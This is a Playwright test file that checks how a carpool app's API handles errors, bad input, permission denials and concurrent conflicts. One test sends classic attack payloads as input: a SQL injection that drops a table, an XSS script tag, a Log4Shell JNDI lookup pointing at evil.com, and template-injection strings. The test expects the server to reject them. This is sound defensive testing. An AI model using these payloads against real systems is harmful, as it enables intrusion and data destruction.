/**
 * Error Scenarios E2E Tests
 * Tests network failures, timeouts, invalid data submissions, permission denied scenarios,
 * concurrent user conflicts, and server error responses
 */

import { test, expect } from '@playwright/test';
import {
  TestUser,
  createTestUser,
  cleanupTestUser,
  makeApiRequest,
  makeApiRequestWithRetry,
  simulateNetworkDelay,
  generateTestUsers,
} from '../utils/test-helpers';

test.describe('Error Scenarios and Edge Cases', () => {
  let parentUser: TestUser;
  let adminUser: TestUser;
  let userToken: string;
  let adminToken: string;

  test.beforeAll(async ({ request }) => {
    parentUser = await createTestUser('parent');
    adminUser = await createTestUser('admin');

    const parentLoginResponse = await makeApiRequest(request, 'POST', '/api/auth-login-simple', {
      email: parentUser.email,
      password: parentUser.password,
    });
    const parentLoginData = await parentLoginResponse.json();
    userToken = parentLoginData.token;

    const adminLoginResponse = await makeApiRequest(request, 'POST', '/api/auth-login-simple', {
      email: adminUser.email,
      password: adminUser.password,
    });
    const adminLoginData = await adminLoginResponse.json();
    adminToken = adminLoginData.token;
  });

  test.afterAll(async () => {
    if (parentUser) await cleanupTestUser(parentUser.email);
    if (adminUser) await cleanupTestUser(adminUser.email);
  });

  test.describe('Network Failures and Timeouts', () => {
    test('handle connection timeout gracefully', async ({ request }) => {
      // Simulate a long-running request that should timeout
      const timeoutResponse = await makeApiRequest(
        request,
        'POST',
        '/api/test-timeout-endpoint',
        { delay: 35000 }, // 35 seconds, should timeout
        { Authorization: `Bearer ${userToken}` },
      );

      // Should handle timeout gracefully
      expect([408, 504, 500]).toContain(timeoutResponse.status());
    });

    test('retry mechanism for failed requests', async ({ request }) => {
      // Test the retry helper function
      let attempts = 0;

      try {
        const response = await makeApiRequestWithRetry(
          request,
          'GET',
          '/api/unreliable-endpoint',
          null,
          { Authorization: `Bearer ${userToken}` },
          3, // retry 3 times
        );

        // Should eventually succeed or fail after retries
        expect([200, 500, 502, 503, 504]).toContain(response.status());
      } catch (error) {
        // Retries exhausted - this is expected for unreliable endpoints
        expect(error).toBeDefined();
      }
    });

    test('handle network disconnection during operation', async ({ request }) => {
      // Start an operation, then simulate network issues
      const response = await makeApiRequest(
        request,
        'POST',
        '/api/trips-create',
        {
          type: 'pickup',
          date: '2025-06-25',
          simulateNetworkIssue: true,
        },
        { Authorization: `Bearer ${userToken}` },
      );

      // Should handle network disconnection gracefully
      expect([0, 500, 502, 503, 504]).toContain(response.status());
    });

    test('handle slow network conditions', async ({ request }) => {
      await simulateNetworkDelay(2000, 5000); // 2-5 second delay

      const response = await makeApiRequest(request, 'GET', '/api/users-me', null, {
        Authorization: `Bearer ${userToken}`,
      });

      // Should still work despite slow network
      expect(response.status()).toBe(200);
    });

    test('handle malformed server responses', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'GET',
        '/api/malformed-response-endpoint',
        null,
        { Authorization: `Bearer ${userToken}` },
      );

      // Should handle malformed JSON gracefully
      try {
        await response.json();
      } catch (error) {
        // Expected - malformed JSON should be caught
        expect(error).toBeDefined();
      }
    });
  });

  test.describe('Invalid Data Submissions', () => {
    test('handle oversized request payloads', async ({ request }) => {
      const oversizedData = {
        description: 'x'.repeat(10000000), // 10MB string
        validField: 'test',
      };

      const response = await makeApiRequest(
        request,
        'POST',
        '/api/parent-group-creation',
        oversizedData,
        { Authorization: `Bearer ${userToken}` },
      );

      expect([400, 413, 422]).toContain(response.status()); // Bad Request or Payload Too Large
    });

    test('handle completely invalid JSON payloads', async ({ request }) => {
      // Send completely malformed data
      const response = await request.post('/api/parent-group-creation', {
        data: '{ invalid json structure {{{{ ',
        headers: {
          Authorization: `Bearer ${userToken}`,
          'Content-Type': 'application/json',
        },
      });

      expect([400, 422]).toContain(response.status());
    });

    test('handle null and undefined values', async ({ request }) => {
      const invalidData = {
        name: null,
        school: undefined,
        maxCapacity: null,
        schedule: {
          days: null,
          pickupTime: undefined,
          dropoffTime: '',
        },
      };

      const response = await makeApiRequest(
        request,
        'POST',
        '/api/parent-group-creation',
        invalidData,
        { Authorization: `Bearer ${userToken}` },
      );

      expect([400, 422]).toContain(response.status());
      const data = await response.json();
      expect(data.error).toBeDefined();
      expect(data.validationErrors).toBeDefined();
    });

    test('handle injection attempts', async ({ request }) => {
      const injectionData = {
        email: "'; DROP TABLE users; --",
        password: '<script>alert("xss")</script>',
        name: '${jndi:ldap://evil.com/exploit}',
        description: '{{7*7}}[[7*7]]',
      };

      const response = await makeApiRequest(
        request,
        'POST',
        '/api/auth-register-simple',
        injectionData,
      );

      expect([400, 422]).toContain(response.status());
      const data = await response.json();
      expect(data.error).toBeDefined();
    });

    test('handle extremely long field values', async ({ request }) => {
      const longData = {
        name: 'A'.repeat(10000),
        email: 'very.long.email.address.that.exceeds.normal.limits'.repeat(10) + '@example.com',
        phone: '1234567890'.repeat(100),
        address: 'Very long address field '.repeat(1000),
      };

      const response = await makeApiRequest(request, 'PUT', '/api/users-me', longData, {
        Authorization: `Bearer ${userToken}`,
      });

      expect([400, 422]).toContain(response.status());
    });

    test('handle special unicode characters', async ({ request }) => {
      const unicodeData = {
        name: '🚗🏫👨‍👩‍👧‍👦 Carpool семья',
        description: 'Тест with émojis 😀 and spëciál chars ñoño',
        notes: '中文字符 العربية हिन्दी',
      };

      const response = await makeApiRequest(
        request,
        'POST',
        '/api/parent-group-creation',
        unicodeData,
        { Authorization: `Bearer ${userToken}` },
      );

      // Should handle unicode gracefully - either accept or reject cleanly
      expect([200, 400, 422]).toContain(response.status());
    });

    test('handle binary data in text fields', async ({ request }) => {
      const binaryData = {
        name: Buffer.from([0x00, 0x01, 0x02, 0x03, 0xff]).toString(),
        description: '\x00\x01\x02\x03\xFF',
      };

      const response = await makeApiRequest(
        request,
        'POST',
        '/api/parent-group-creation',
        binaryData,
        { Authorization: `Bearer ${userToken}` },
      );

      expect([400, 422]).toContain(response.status());
    });
  });

  test.describe('Permission Denied Scenarios', () => {
    test('access admin endpoints with parent token', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'GET',
        '/api/admin-role-management',
        null,
        { Authorization: `Bearer ${userToken}` }, // Parent user token
      );

      expect(response.status()).toBe(403);
      const data = await response.json();
      expect(data.error).toContain('permission');
    });

    test('modify other users data', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'PUT',
        '/api/admin-create-user',
        {
          userId: 'other-user@example.com',
          name: 'Hacked Name',
        },
        { Authorization: `Bearer ${userToken}` },
      );

      expect([403, 404]).toContain(response.status());
    });

    test('access resources without authentication', async ({ request }) => {
      const protectedEndpoints = [
        '/api/users-me',
        '/api/parent-group-creation',
        '/api/trips-list',
        '/api/notifications-history',
        '/api/admin-carpool-groups',
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await makeApiRequest(request, 'GET', endpoint);
        expect(response.status()).toBe(401);
      }
    });

    test('use expired token', async ({ request }) => {
      const expiredToken =
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InRlc3QiLCJleHAiOjE2MDAwMDAwMDB9.expired';

      const response = await makeApiRequest(request, 'GET', '/api/users-me', null, {
        Authorization: `Bearer ${expiredToken}`,
      });

      expect(response.status()).toBe(401);
      const data = await response.json();
      expect(data.error).toMatch(/expired|invalid/i);
    });

    test('access resources with invalid token format', async ({ request }) => {
      const invalidTokens = [
        'not-a-token',
        'Bearer',
        'Bearer ',
        'Bearer invalid.token.format',
        'InvalidPrefix validtoken',
      ];

      for (const token of invalidTokens) {
        const response = await makeApiRequest(request, 'GET', '/api/users-me', null, {
          Authorization: token,
        });

        expect(response.status()).toBe(401);
      }
    });

    test('cross-tenant data access attempts', async ({ request }) => {
      // Try to access data from different school/organization
      const response = await makeApiRequest(
        request,
        'GET',
        '/api/admin-carpool-groups?schoolId=other-school-id',
        null,
        { Authorization: `Bearer ${adminToken}` },
      );

      // Should either return empty results or permission denied
      expect([200, 403]).toContain(response.status());

      if (response.status() === 200) {
        const data = await response.json();
        expect(data.groups).toHaveLength(0); // No cross-tenant access
      }
    });
  });

  test.describe('Concurrent User Conflicts', () => {
    test('simultaneous group creation with same name', async ({ request }) => {
      const groupData = {
        name: `Concurrent Test Group ${Date.now()}`,
        school: 'Test School',
        maxCapacity: 4,
      };

      // Create multiple simultaneous requests
      const promises = Array.from({ length: 5 }, () =>
        makeApiRequest(request, 'POST', '/api/parent-group-creation', groupData, {
          Authorization: `Bearer ${userToken}`,
        }),
      );

      const responses = await Promise.all(promises);

      // Only one should succeed, others should fail with conflict
      const successResponses = responses.filter((r) => r.status() === 200);
      const conflictResponses = responses.filter((r) => r.status() === 409);

      expect(successResponses.length).toBe(1);
      expect(conflictResponses.length).toBeGreaterThan(0);
    });

    test('concurrent user profile updates', async ({ request }) => {
      const updates = [
        { name: 'Updated Name 1' },
        { phone: '+1555000001' },
        { preferences: { notifications: { email: true } } },
        { address: { street: '123 New Street' } },
      ];

      const promises = updates.map((update) =>
        makeApiRequest(request, 'PUT', '/api/users-me', update, {
          Authorization: `Bearer ${userToken}`,
        }),
      );

      const responses = await Promise.all(promises);

      // Some updates might conflict, but system should handle gracefully
      const successResponses = responses.filter((r) => r.status() === 200);
      expect(successResponses.length).toBeGreaterThan(0);
    });

    test('concurrent trip booking for same time slot', async ({ request }) => {
      const tripData = {
        type: 'pickup',
        date: '2025-06-25',
        time: '08:00',
        driverId: parentUser.email,
      };

      // Multiple users trying to book same driver at same time
      const testUsers = generateTestUsers(3);
      const promises = testUsers.map((user) =>
        makeApiRequest(
          request,
          'POST',
          '/api/trips-create',
          { ...tripData, parentId: user.email },
          { Authorization: `Bearer ${userToken}` },
        ),
      );

      const responses = await Promise.all(promises);

      // Only one booking should succeed
      const successResponses = responses.filter((r) => r.status() === 200);
      expect(successResponses.length).toBeLessThanOrEqual(1);
    });

    test('simultaneous driver assignment conflicts', async ({ request }) => {
      const assignmentData = {
        tripId: 'test-trip-id',
        driverId: parentUser.email,
        date: '2025-06-25',
      };

      // Multiple admins trying to assign same driver
      const promises = Array.from({ length: 3 }, () =>
        makeApiRequest(request, 'POST', '/api/admin-driver-selection', assignmentData, {
          Authorization: `Bearer ${adminToken}`,
        }),
      );

      const responses = await Promise.all(promises);

      // Should handle conflicts gracefully
      const successResponses = responses.filter((r) => r.status() === 200);
      const conflictResponses = responses.filter((r) => r.status() === 409);

      expect(successResponses.length + conflictResponses.length).toBe(3);
    });

    test('race condition in swap request handling', async ({ request }) => {
      const swapData = {
        originalDate: '2025-06-25',
        requestedDate: '2025-06-26',
        reason: 'Schedule conflict',
      };

      // Multiple users trying to make swap requests simultaneously
      const promises = Array.from({ length: 4 }, (_, i) =>
        makeApiRequest(
          request,
          'POST',
          '/api/parent-swap-requests',
          { ...swapData, requestId: `swap-${i}` },
          { Authorization: `Bearer ${userToken}` },
        ),
      );

      const responses = await Promise.all(promises);

      // System should handle race conditions without corruption
      responses.forEach((response) => {
        expect([200, 409, 422]).toContain(response.status());
      });
    });
  });

  test.describe('Server Error Responses', () => {
    test('handle 500 internal server errors gracefully', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'POST',
        '/api/trigger-server-error',
        { errorType: 'internal' },
        { Authorization: `Bearer ${userToken}` },
      );

      expect(response.status()).toBe(500);

      try {
        const data = await response.json();
        expect(data.error).toBeDefined();
        expect(data.requestId).toBeDefined(); // For support tracking
      } catch {
        // Server might not return JSON on 500 errors
        expect(response.status()).toBe(500);
      }
    });

    test('handle database connection failures', async ({ request }) => {
      const response = await makeApiRequest(request, 'GET', '/api/test-db-failure', null, {
        Authorization: `Bearer ${userToken}`,
      });

      expect([500, 503]).toContain(response.status());
    });

    test('handle service unavailable conditions', async ({ request }) => {
      const response = await makeApiRequest(request, 'GET', '/api/test-service-unavailable', null, {
        Authorization: `Bearer ${userToken}`,
      });

      expect(response.status()).toBe(503);

      // Should include retry-after header
      const retryAfter = response.headers()['retry-after'];
      if (retryAfter) {
        expect(Number(retryAfter)).toBeGreaterThan(0);
      }
    });

    test('handle memory exhaustion scenarios', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'POST',
        '/api/memory-intensive-operation',
        { dataSize: 'large' },
        { Authorization: `Bearer ${userToken}` },
      );

      // Should either succeed or fail gracefully
      expect([200, 500, 503]).toContain(response.status());
    });

    test('handle external service failures', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'POST',
        '/api/address-validation',
        {
          street: '123 Test Street',
          city: 'Test City',
          state: 'CA',
          zipCode: '12345',
          simulateExternalFailure: true,
        },
        { Authorization: `Bearer ${userToken}` },
      );

      // Should handle external service failures gracefully
      expect([200, 500, 502, 503]).toContain(response.status());

      if (response.status() !== 200) {
        const data = await response.json();
        expect(data.error).toBeDefined();
        expect(data.fallbackUsed).toBeDefined();
      }
    });
  });

  test.describe('Resource Exhaustion', () => {
    test('handle high volume of simultaneous requests', async ({ request }) => {
      // Create many simultaneous requests
      const promises = Array.from({ length: 50 }, (_, i) =>
        makeApiRequest(request, 'GET', `/api/users-me?req=${i}`, null, {
          Authorization: `Bearer ${userToken}`,
        }),
      );

      const responses = await Promise.all(promises);

      // Most should succeed, some might be rate limited
      const successResponses = responses.filter((r) => r.status() === 200);
      const rateLimitedResponses = responses.filter((r) => r.status() === 429);

      expect(successResponses.length).toBeGreaterThan(30); // At least 60% success
      expect(successResponses.length + rateLimitedResponses.length).toBe(50);
    });

    test('handle large dataset operations', async ({ request }) => {
      const response = await makeApiRequest(
        request,
        'GET',
        '/api/trips-stats-db?period=all_time&includeDetails=true',
        null,
        { Authorization: `Bearer ${adminToken}` },
      );

      // Should either succeed or timeout gracefully
      expect([200, 408, 500]).toContain(response.status());
    });

    test('handle concurrent database operations', async ({ request }) => {
      const operations = [
        { endpoint: '/api/users-me', method: 'GET' },
        { endpoint: '/api/trips-list', method: 'GET' },
        { endpoint: '/api/notifications-history', method: 'GET' },
        { endpoint: '/api/parent-group-search', method: 'POST', data: { school: 'Test' } },
      ];

      const promises = operations.map((op) =>
        makeApiRequest(request, op.method as any, op.endpoint, op.data, {
          Authorization: `Bearer ${userToken}`,
        }),
      );

      const responses = await Promise.all(promises);

      // All should complete without deadlocks
      responses.forEach((response) => {
        expect([200, 429, 500]).toContain(response.status());
      });
    });
  });

  test.describe('Edge Case Data Scenarios', () => {
    test('handle date boundary conditions', async ({ request }) => {
      const edgeDates = [
        '1900-01-01', // Very old date
        '2099-12-31', // Far future date
        '2024-02-29', // Leap year
        '2025-02-29', // Invalid leap year date
        '2025-13-01', // Invalid month
        '2025-06-32', // Invalid day
        '', // Empty date
        'invalid-date', // Completely invalid
      ];

      for (const date of edgeDates) {
        const response = await makeApiRequest(
          request,
          'POST',
          '/api/trips-create',
          {
            type: 'pickup',
            date: date,
            time: '08:00',
          },
          { Authorization: `Bearer ${userToken}` },
        );

        // Should validate dates properly
        if (['1900-01-01', '2099-12-31', '2024-02-29'].includes(date)) {
          expect([200, 400]).toContain(response.status());
        } else {
          expect([400, 422]).toContain(response.status());
        }
      }
    });

    test('handle extreme numeric values', async ({ request }) => {
      const extremeValues = [
        Number.MAX_SAFE_INTEGER,
        Number.MIN_SAFE_INTEGER,
        Number.POSITIVE_INFINITY,
        Number.NEGATIVE_INFINITY,
        NaN,
        0,
        -1,
        2.5, // Decimal where integer expected
      ];

      for (const value of extremeValues) {
        const response = await makeApiRequest(
          request,
          'POST',
          '/api/parent-group-creation',
          {
            name: 'Test Group',
            maxCapacity: value,
          },
          { Authorization: `Bearer ${userToken}` },
        );

        // Should validate numeric inputs
        expect([200, 400, 422]).toContain(response.status());
      }
    });

    test('handle empty and whitespace-only inputs', async ({ request }) => {
      const emptyInputs = {
        name: '',
        description: '   ', // Whitespace only
        school: '\t\n\r', // Various whitespace chars
        contact: null,
      };

      const response = await makeApiRequest(
        request,
        'POST',
        '/api/parent-group-creation',
        emptyInputs,
        { Authorization: `Bearer ${userToken}` },
      );

      expect([400, 422]).toContain(response.status());
      const data = await response.json();
      expect(data.validationErrors).toBeDefined();
    });
  });
});
